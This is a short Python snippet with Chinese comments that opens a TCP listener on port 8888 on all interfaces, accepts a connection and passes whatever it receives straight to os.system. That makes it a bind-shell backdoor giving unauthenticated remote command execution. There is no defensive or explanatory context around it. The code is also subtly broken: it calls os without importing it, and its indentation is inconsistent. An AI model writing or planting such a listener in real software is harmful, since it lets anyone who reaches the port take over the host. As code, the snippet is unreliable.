import socket

    # 创建一个套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 绑定本地地址和端口
    s.bind(('0.0.0.0', 8888))

    # 监听连接
    s.listen(5)

    # 接收连接
    conn, addr = s.accept()

    # 接收数据
    data = conn.recv(1024)

    # 执行命令
    os.system(data.decode())

    # 关闭连接
    conn.close()
    s.close()
